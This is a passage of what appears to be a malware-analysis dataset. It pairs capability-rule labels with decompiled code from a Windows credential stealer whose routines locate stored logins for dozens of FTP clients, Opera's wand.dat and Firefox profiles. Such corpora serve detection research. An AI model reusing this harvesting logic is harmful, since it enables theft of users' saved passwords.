fcn.004018b8(uVar2);\n    }\n    fcn.00405817(arg_8h, 0x1a);\n    fcn.00405817(arg_8h, 0x23);\n    fcn.00405817(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 491
    },
    "00405cca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather bulletproof-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405cca(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 8, 0);\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\BPFTP\\\\Bullet Proof FTP\\\\Main\", \"LastSessionFile\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, iVar1, 0xbeef0001);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\BulletProof Software\\\\BulletProof FTP Client\\\\Main\", \"LastSessionFile\", 0\n                        );\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, iVar1, 0xbeef0001);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\BPFTP\\\\Bullet Proof FTP\\\\Options\", \"SitesDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00405c6c(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\BulletProof Software\\\\BulletProof FTP Client\\\\Options\", \"SitesDir\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00405c6c(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\BPFTP\", \"InstallDir1\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00405c6c(arg_8h, iVar1);\n        fcn.004018b8(uVar2);\n    }\n    fcn.00405c9d(arg_8h, 0x1c);\n    fcn.00405c9d(arg_8h, 0x1a);\n    fcn.00405c9d(arg_8h, 0x23);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 593
    },
    "00405e49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e49(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 9, 0);\n    fcn.00405de8(arg_8h, 0x1a);\n    fcn.00405de8(arg_8h, 0x23);\n    fcn.00405de8(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 128
    },
    "00405f04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather turbo-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f04(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 10, 0);\n    fcn.00405e8b(arg_8h, \"addrbk.dat\", 0xbeef0000);\n    fcn.00405e8b(arg_8h, \"quick.dat\", 0xbeef0001);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 123
    },
    "0040614b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ffftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040614b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0xb, 0);\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\Sota\\\\FFFTP\", \"CredentialSalt\", &var_8h);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404017(arg_8h, iVar1, var_8h, 0xbeef0001);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\Sota\\\\FFFTP\", \"CredentialCheck\", &var_8h);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404017(arg_8h, iVar1, var_8h, 0xbeef0002);\n        fcn.004018b8(uVar2);\n    }\n    fcn.00405f4c(arg_8h, \"Software\\\\Sota\\\\FFFTP\\\\Options\");\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 311
    },
    "004063cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063cc(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0xc, 0);\n    fcn.004061e4(arg_8h, \"Software\\\\CoffeeCup Software\\\\Internet\\\\Profiles\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 97
    },
    "0040665e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather coreftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040665e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0xd, 0);\n    fcn.004063fd(arg_8h, \"Software\\\\FTPWare\\\\COREFTP\\\\Sites\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 96
    },
    "00406915": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftp-explorer information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406915(uint arg_8h)\n\n{\n    int32_t arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0xe, 0);\n    fcn.0040439c(arg_8h, \"\\\\FTP Explorer\", \"profiles.xml\", 0xbeef0000);\n    arg_ch = fcn.00401d71(*0x414869, \"Software\\\\FTP Explorer\\\\FTP Explorer\\\\Workspace\\\\MFCToolBar-224\", \"Buttons\", \n                          &var_8h);\n    if (arg_ch != 0) {\n        fcn.00401569(arg_8h, 0xbeef0001);\n        fcn.0040159f(arg_8h, arg_ch, var_8h);\n        fcn.004018b8(arg_ch);\n    }\n    fcn.0040668f(arg_8h, \"Software\\\\FTP Explorer\\\\Profiles\");\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 248
    },
    "004069a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather frigate3 information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004069a0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0xf, 0);\n    fcn.0040439c(arg_8h, \"\\\\Frigate3\", \"FtpSite.xml\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "004069db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather securefx information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004069db(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x10, 0);\n    str._VanDykeConfigSessions[0] = '\\\\';\n    fcn.0040439c(arg_8h, \"_VanDyke\\\\Config\\\\Sessions\", \".ini\", 0xbeef0000);\n    arg_8h_00 = fcn.00401d71(*0x414869, \"Software\\\\VanDyke\\\\SecureFX\", \"Config Path\", 0);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.00401e4c(arg_8h_00, \"\\\\Sessions\");\n        arg_8h_01 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \".ini\", 0xbeef0000);\n        fcn.004018b8(arg_8h_01);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 282
    },
    "00406ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather ftprush information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406ae0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x12, 0);\n    fcn.0040439c(arg_8h, \"\\\\FTPRush\", \"RushSite.xml\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "00406ce3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406ce3(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x13, 0);\n    fcn.00406b1b(arg_8h, \"Software\\\\Cryer\\\\WebSitePublisher\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 99
    },
    "00406d14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather bitkinex information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406d14(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x14, 0);\n    fcn.0040439c(arg_8h, \"\\\\BitKinex\", \"bitkinex.ds\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "00406f43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406f43(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.0041066a(arg_ch);\n    var_4h = fcn.004018cf(var_8h);\n    iVar1 = fcn.00402699(arg_ch, var_8h, var_4h);\n    if (iVar1 != 0) {\n        var_ch = iVar1;\n        iVar1 = fcn.004043dc(var_4h, &var_ch, 0);\n        if (iVar1 != 0) {\n            fcn.00401569(arg_8h, 0xbeef1000);\n            fcn.0040159f(arg_8h, arg_ch, var_8h);\n            fcn.0040159f(arg_8h, var_4h, var_ch);\n        }\n    }\n    fcn.004018b8(var_4h);\n    return;\n}\n",
        "token_count": 238
    },
    "00407086": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather expandrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407086(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x15, 0);\n    fcn.00406d4f(arg_8h, \"Software\\\\ExpanDrive\\\\Sessions\");\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\ExpanDrive\", \"ExpanDrive_Home\", 0);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00401e4c(iVar1, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406fbb(arg_8h, uVar2);\n        fcn.004018b8(uVar3);\n    }\n    iVar1 = fcn.00401eb1(0x1a);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401e4c(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401e4c(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406fbb(arg_8h, uVar2);\n        fcn.004018b8(uVar3);\n    }\n    iVar1 = fcn.00401eb1(0x1c);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401e4c(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401e4c(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406fbb(arg_8h, uVar2);\n        fcn.004018b8(uVar3);\n    }\n    iVar1 = fcn.00401eb1(0x23);\n    if (iVar1 != 0) {\n        uVar3 = fcn.00401e4c(iVar1, \"\\\\ExpanDrive\");\n        uVar2 = fcn.00401e4c(uVar3, \"\\\\drives.js\");\n        uVar3 = arg_8h;\n        fcn.00406fbb(arg_8h, uVar2);\n        fcn.004018b8(uVar3);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 557
    },
    "0040735e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather classicftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040735e(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x16, 0);\n    fcn.0040717c(arg_8h, 0x80000002, \"Software\\\\NCH Software\\\\ClassicFTP\\\\FTPAccounts\");\n    fcn.0040717c(arg_8h, *0x414869, \"Software\\\\NCH Software\\\\ClassicFTP\\\\FTPAccounts\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 139
    },
    "00407589": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather fling-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407589(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x17, 0);\n    fcn.004073a7(arg_8h, *0x414869, \"SOFTWARE\\\\NCH Software\\\\Fling\\\\Accounts\");\n    fcn.004073a7(arg_8h, 0x80000002, \"SOFTWARE\\\\NCH Software\\\\Fling\\\\Accounts\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 136
    },
    "00407685": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather softx-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407685(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x18, 0);\n    fcn.004075d2(arg_8h, *0x414869, \"Software\\\\FTPClient\\\\Sites\");\n    fcn.004075d2(arg_8h, 0x80000002, \"Software\\\\FTPClient\\\\Sites\");\n    fcn.004075d2(arg_8h, *0x414869, \"Software\\\\SoftX.org\\\\FTPClient\\\\Sites\");\n    fcn.004075d2(arg_8h, 0x80000002, \"Software\\\\SoftX.org\\\\FTPClient\\\\Sites\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 191
    },
    "00407754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407754(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x19, 0);\n    fcn.004076f3(arg_8h, 0x1a);\n    fcn.004076f3(arg_8h, 0x23);\n    fcn.004076f3(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 129
    },
    "00407853": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather direct-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407853(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x1a, 0);\n    fcn.00407796(arg_8h, 0x1a, 0);\n    fcn.00407796(arg_8h, 0x23, 0);\n    fcn.00407796(arg_8h, 0x1c, 0);\n    fcn.00407796(arg_8h, 0x1a, \"\\\\CoffeeCup Software\");\n    fcn.00407796(arg_8h, 0x23, \"\\\\CoffeeCup Software\");\n    fcn.00407796(arg_8h, 0x1c, \"\\\\CoffeeCup Software\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 207
    },
    "00407e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e20(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x1c, 0);\n    fcn.00407bba(arg_8h, *0x414869, \"Software\\\\Martin Prikryl\");\n    fcn.00407bba(arg_8h, 0x80000002, \"Software\\\\Martin Prikryl\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 132
    },
    "00407e69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e69(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_ch;\n    uint arg_8h_00;\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x1d, 0);\n    uVar1 = fcn.0041073c(&var_109h, 0x104);\n    if ((uVar1 != 0) && (uVar1 < 0x105)) {\n        arg_ch = fcn.00401df8(&var_109h, \"\\\\32BitFtp.ini\");\n        arg_8h_00 = arg_8h;\n        fcn.0040406c(arg_8h, arg_ch, 0xbeef0000);\n        fcn.004018b8(arg_8h_00);\n    }\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 225
    },
    "00407ed1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather netdrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ed1(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x1e, 0);\n    fcn.0040439c(arg_8h, \"\\\\NetDrive\", \"NDSites.ini\", 0xbeef0000);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 105
    },
    "00408124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather southriver-webdrive information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408124(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x1f, 0);\n    fcn.00407f0c(arg_8h, *0x414869, \"Software\\\\South River Technologies\\\\WebDrive\\\\Connections\");\n    fcn.00407f0c(arg_8h, 0x80000002, \"Software\\\\South River Technologies\\\\WebDrive\\\\Connections\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 139
    },
    "00408426": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408426(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    fcn.00401364(arg_8h, arg_ch);\n    iVar3 = arg_8h;\n    iVar1 = fcn.00401522(arg_8h);\n    if (iVar3 != 0) {\n        var_4h = fcn.00408207(arg_8h, arg_ch, &var_ch);\n        var_8h = fcn.00408207(arg_8h, arg_ch, &var_10h);\n        uVar2 = fcn.00408293(var_4h, var_ch, var_8h, var_10h);\n        fcn.004018b8(var_4h);\n        fcn.004018b8(var_8h);\n    }\n    fcn.00401047(arg_8h, iVar1 + iVar3, 0);\n    return uVar2;\n}\n",
        "token_count": 262
    },
    "0040891c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040891c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0040413f(arg_ch);\n    if (iVar1 == 0) {\n        fcn.00401000(&var_4h);\n        iVar1 = fcn.0040120d(arg_ch, var_4h);\n        if (iVar1 != 0) {\n            fcn.004086d8(var_4h, arg_8h);\n        }\n        fcn.00401021(var_4h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "00408c43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408c43(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint in_stack_ffffff6c;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x21, 0);\n    fcn.00408c21(arg_8h, 0x1a);\n    fcn.00408c21(arg_8h, 0x23);\n    fcn.00408c21(arg_8h, 0x1c);\n    iVar1 = fcn.00401d71(*0x414869, 0x415d3d, \"Last Directory3\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00408961(arg_8h, iVar1, \"wand.dat\");\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(*0x414869, 0x415d3d, \"Last Install Path\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00408961(arg_8h, iVar1, \"wand.dat\");\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000000, \"Opera.HTML\\\\shell\\\\open\\\\command\", 0, 0);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040242b(iVar1);\n        if (iVar1 != 0) {\n            in_stack_ffffff6c = arg_8h;\n            fcn.00408961(arg_8h, iVar1, \"wand.dat\");\n            fcn.004018b8(in_stack_ffffff6c);\n        }\n        fcn.004018b8(in_stack_ffffff6c);\n    }\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 459
    },
    "00408e0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "gather wise-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e0d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    uint in_stack_fffff758;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            arg_ch_00 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            uVar2 = fcn.00401d71(arg_ch, arg_ch_00, 0, 0);\n            iVar1 = fcn.0040242b(uVar2);\n            if (iVar1 != 0) {\n                iVar3 = fcn.00401f7e(iVar1);\n                if (iVar3 != 0) {\n                    fcn.00404351(arg_8h, iVar1, \"wiseftpsrvs.ini\", 0xbeef0002);\n                    fcn.00404351(arg_8h, iVar1, \"wiseftp.ini\", 0xbeef0002);\n                    in_stack_fffff758 = arg_8h;\n                    fcn.00404351(arg_8h, iVar1, \"wiseftpsrvs.bin\", 0xbeef0000);\n                }\n                fcn.004018b8(in_stack_fffff758);\n            }\n            fcn.004018b8(uVar2);\n            fcn.00408e0d(arg_8h, arg_ch, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "00408f4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "gather wise-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408f4f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x22, 0);\n    fcn.0040439c(arg_8h, \"\\\\AceBIT\", \"wiseftpsrvs.bin\", 0xbeef0000);\n    fcn.00408d1e(arg_8h, *0x414869, \"Software\\\\AceBIT\");\n    fcn.00408d1e(arg_8h, 0x80000002, \"Software\\\\AceBIT\");\n    fcn.00408e0d(arg_8h, 0x80000002, \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}\");\n    fcn.00408e0d(arg_8h, 0x80000002, \"SOFTWARE\\\\Classes\\\\TypeLib\\\\{9EA55529-E122-4757-BC79-E4825F80732C}\");\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 266
    },
    "0040901f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040901f(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x23, 0);\n    fcn.00408fd3(arg_8h, 0x1a);\n    fcn.00408fd3(arg_8h, 0x23);\n    fcn.00408fd3(arg_8h, 0x1c);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 130
    },
    "0040923f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040923f(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    uVar1 = (**0x41602c)(arg_8h, arg_ch);\n    uVar2 = (**0x416028)(arg_8h, arg_ch);\n    *arg_10h = uVar2;\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "00409c3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c3c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    uint uVar2;\n    int32_t in_stack_ffffffa4;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00410808(arg_10h, arg_14h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00401d71(arg_ch, arg_10h, \"PathToExe\", 0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040242b(iVar1);\n            if (iVar1 != 0) {\n                arg_8h_00 = fcn.00401eb1(0x1a);\n                if (arg_8h_00 != 0) {\n                    arg_ch_00 = fcn.00401e4c(arg_8h_00, arg_18h);\n                    uVar2 = arg_8h;\n                    fcn.00409ac1(arg_8h, arg_ch_00, iVar1);\n                    fcn.004018b8(uVar2);\n                }\n                fcn.004018b8(iVar1);\n                in_stack_ffffffa4 = iVar1;\n            }\n            fcn.004018b8(in_stack_ffffffa4);\n        }\n    }\n    var_8h = fcn.004018cf(0x800);\n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_10h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_10h, var_8h, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            uVar2 = fcn.00401e4c(uVar2, var_8h);\n            fcn.00409c3c(arg_8h, arg_ch, uVar2, arg_14h, arg_18h);\n            fcn.004018b8(uVar2);\n            var_10h = var_10h + 1;\n        }\n        fcn.004107c0();\n    }\n    fcn.004018b8(var_8h);\n    return;\n}\n",
        "token_count": 630
    },
    "00409d44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409d44(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x24, 0);\n    *0x416030 = 0;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", \"Firefox\", \"\\\\Mozilla\\\\Firefox\\\\\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 191
    },
    "00409dcb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
